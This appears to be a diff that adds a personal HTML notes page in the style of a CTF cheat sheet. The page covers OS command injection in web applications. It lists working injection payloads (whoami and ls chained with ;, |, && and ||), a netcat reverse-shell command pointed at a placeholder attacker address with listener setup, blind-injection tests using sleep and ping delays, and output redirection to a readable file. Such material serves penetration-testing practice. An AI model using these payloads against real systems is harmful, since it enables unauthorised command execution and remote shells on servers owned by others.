@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL INFORMATION</h2>  
+
+INFO: Collection of different test to confirm the vulnerability, this can be reflected in browser sometimes.<br><br>
+
+NOTE:<br> <br>
+- Manual inspection is needed, source code, headers, behavior, etc. You can use variants of symbols to pipe and
+add more commands to retrieve content. [ ; or & or && and | or || ]<br><br>
+
+C1: ';whoami;#<br>
+C2: ';which php;#<br>
+C3: 1|whoami<br><br>
+
+SAMPLE: /?q='whoami'<br><br>
+
+NOTE:<br> <br>
+- If possible, try any command to get some kind of reverse shell! For that check what technologies are present, change the 
+technology to validate. [C2]<br>
+
+In a CTF style, it is pretty common to see a web page with some functionality, maybe connectivity tests or log information. <br><br>
+
+<u>Things to check:</u><br><br>
+
+  1. inpunt fields without proper validation ?<br>
+  2. any known functionality ? PING, DNS, etc<br>
+  3. is the action providing some results ?<br><br>
+
+How to test:<br><br>
+
+  1. use the ";" to add more commands to see if the output reflects what you are doing.<br>
+  SAMPLE PING SCENARIO SHOWING DIR CONTENT: action=ping&ip_address=10.12.180.20;ls&submit=Action<br>
+  2. start enumeration and read files to move.<br><br>
+
+<u>GENERATE A SHELL</u><br><br>
+
+C1: && nc -vn IP_ADDR PORT -e /bin/bash<br><br>
+
+NOTE:<br> <br>
+- Remember to set up a listener, "nc -lvp PORT"
+
+<h2>2. BLIND COMMAND INJECTION</h2>       
+
+NOTE:<br> <br>
+- It will be more related to behavior, similar to blind-sqli. Content in browser, cookies, etc.<br><br>
+
+<u>COMMON ATTEMPTS</u><br><br>
+
+<u>TIME DELAY</u><br><br>
+
+1. Identify the vulnerable parameter.<br>
+2. Attempt different tests on each field. [encode payloads]<br><br>
+
+C1: /?q='sleep 10'<br>
+C2: & sleep 10 #<br>
+C3: x||ping+-c+10+127.0.0.1||<br><br>
+
+<u>OUTPUT REDIRECTION</u><br><br>
+
+1. Identify the vulnerable parameter.<br>
+2. Find the path with necessary rights to write output data.<br>
+3. Navigate to the path and load the file to check results.<br><br>
+
+C1: ||whoami>/path/to/file/output.txt||<br><br>
+
+After output completed, you can read the file invoking the name, <br><br>
+
+SAMPLE: /temp?filename=output.txt
+
+
+    </article>
+  </main>
+</body>
+</html>
